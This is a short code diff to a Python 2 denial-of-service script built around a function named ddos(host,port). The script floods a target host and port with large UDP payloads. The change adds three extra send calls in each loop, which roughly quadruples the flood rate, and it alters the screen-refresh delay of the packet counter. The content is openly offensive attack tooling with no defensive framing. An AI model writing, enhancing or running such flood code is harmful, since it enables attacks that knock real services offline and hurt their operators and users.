@@ -44,7 +44,10 @@ def ddos(host,port):
             if ready:
                 try:
                     sock.send("hellohellohellohellohellohellohello"*1871)
-                    pkgcount += 1
+                    sock.send("hellohellohellohellohellohellohello"*1871)
+                    sock.send("hellohellohellohellohellohellohello"*1871)
+                    sock.send("hellohellohellohellohellohellohello"*1871)
+                    pkgcount += 4
                 except:
                     sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                     try:
@@ -156,7 +159,7 @@ else:
                     
                     print "\x1b[H\x1b[2J\x1b[3J"
                     print "Packages: {0}".format(pkgcount)
-                    time.sleep(0.001)
+                    time.sleep(0.01)
                 except KeyboardInterrupt:
                     print "Abort"
                     break
